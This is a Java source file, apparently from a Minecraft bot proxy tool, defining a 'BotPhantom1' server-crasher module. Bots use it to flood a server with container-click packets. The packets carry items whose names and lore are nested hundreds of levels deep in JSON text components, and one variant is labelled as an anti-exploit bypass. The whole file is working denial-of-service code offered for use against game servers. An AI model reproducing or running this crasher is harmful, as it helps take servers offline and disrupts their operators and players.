package us.whitedev.proxy.functions.crashers.impl;

import com.github.steveice10.mc.protocol.codec.MinecraftPacket;
import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
import com.github.steveice10.mc.protocol.data.game.inventory.ContainerActionType;
import com.github.steveice10.mc.protocol.data.game.inventory.DropItemAction;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCommandSuggestionPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.inventory.ServerboundContainerClickPacket;
import com.github.steveice10.opennbt.tag.builtin.CompoundTag;
import com.github.steveice10.opennbt.tag.builtin.ListTag;
import com.github.steveice10.opennbt.tag.builtin.StringTag;
import com.github.steveice10.opennbt.tag.builtin.Tag;
import com.github.steveice10.packetlib.packet.Packet;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import us.whitedev.proxy.functions.crashers.BotCrasher;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class BotPhantom1 implements BotCrasher {

    @Override
    public String getName() {
        return "BotPhantom1";
    }

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[0]);
        String type = args[1].toLowerCase(Locale.ROOT);

        msgHelper.sendMessage("Bots Starting crashing with &f" + getName(), true);

        Packet packet = getPacketAbuser(type);

        if(packet != null)
            for (int i = 0; i < packets; i++) botsRep.sendPacket(packet, true);
        else
            msgHelper.sendMessage("&cInvalid &7\"type\" argument!", true);

        msgHelper.sendMessage("Bots Attacks &asuccessful &7finished!", true);
    }

    // Ngl, im not sure if its well recoded to mcprotocollib, cuz, here building NBT is different
    // So I cant be sure it will be readable by server
    // I wish it will be, It should be, cuz, it looks fine
    // And I'm too lazy to check it by my own :D (If u want, check it and lmk)

    private Packet getPacketAbuser(String type) {
        CompoundTag comp = new CompoundTag("display");
        List<Tag> lore = new ArrayList<>();

        String translate = "{\"translate\":\"%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[\"..\"]}]}]}]}]}]}]}]}]}]}]}]}]}";
        String extra = "{" + "extra:[{".repeat(700) + "text:م}],".repeat(700) + "text:م}";
        String smallExtra = "{" + "extra:[{" + "text:م}]," + "text:م}";

        CompoundTag display = new CompoundTag("");
        ItemStack itemStack;
        Int2ObjectMap<ItemStack> itemMap = new Int2ObjectOpenHashMap<>();

        switch (type) {
            case "default", "ef-bypass" -> {
                StringTag loreLine = new StringTag(translate);
                for (int i = 0; i < 4; ++i) {
                    lore.add(loreLine);
                }

                display.put(new StringTag("Name", type.equals("ef-bypass") ? smallExtra : extra));
                display.put(new ListTag("Lore", lore));
                comp.put(display);

                itemStack = new ItemStack(218, 1, comp);
                for (int i = 0; i < 10; ++i) {
                    itemMap.put(i, itemStack);
                }
                return new ServerboundContainerClickPacket(0, 0, 1, ContainerActionType.CLICK_ITEM, DropItemAction.DROP_SELECTED_STACK, itemStack, itemMap);
            }
            case "low-data" -> {
                StringTag loreLine = new StringTag(smallExtra);
                lore.add(loreLine);


                display.put(new StringTag("Name", smallExtra));
                display.put(new ListTag("Lore", lore));
                comp.put(display);

                itemStack = new ItemStack(218, 1, comp);
                itemMap.put(0, itemStack);

                return new ServerboundContainerClickPacket(0, 0, 1, ContainerActionType.CLICK_ITEM, DropItemAction.DROP_SELECTED_STACK, itemStack, itemMap);
            }
            case "unreachable" -> {
                return new ServerboundCommandSuggestionPacket(0, "xynis");
            }
        }
        return null;
    }

    @Override
    public String[] getArgsName() {
        return new String[]{"Packets", "Type[Default, EF-Bypass, Low-Data, Unreachable]"};
    }

    @Override
    public String[] getArgsType() {
        return new String[]{"int", "list"};
    }


    @Override
    public String getDescription() {
        return "Low Data Server Crasher";
    }
}
